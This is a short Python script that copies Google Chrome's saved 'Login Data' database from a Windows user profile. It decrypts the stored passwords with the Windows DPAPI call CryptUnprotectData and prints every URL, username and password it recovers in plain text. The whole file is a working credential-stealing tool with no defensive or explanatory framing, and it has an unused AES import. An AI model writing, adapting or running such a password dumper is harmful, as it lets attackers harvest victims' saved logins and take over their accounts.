import os
import sqlite3
import win32crypt
import base64
import shutil
import sys
from Cryptodome.Cipher import AES
import json

path = r'C:\Users\Admin\AppData\Local\Google\Chrome\User Data\Default\Login Data'

try:
    print('[+] Opening ' + path)
    shutil.copy2(path, "Loginvault.db")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
except Exception as e:
    print('[-] %s' % (e))
    sys.exit(1)

try:
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
except Exception as e:
    print('[-] %s' % (e))
    sys.exit(1)

data = cursor.fetchall()

if len(data) > 0:
    for result in data:
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception as e:
            print('[-] %s' % (e))
            pass
        if password:
            print('''[+] URL: %s
    Username: %s 
    Password: %s''' %(result[0], result[1], password))
else:
    print('[-] No results returned from query')
    sys.exit(0)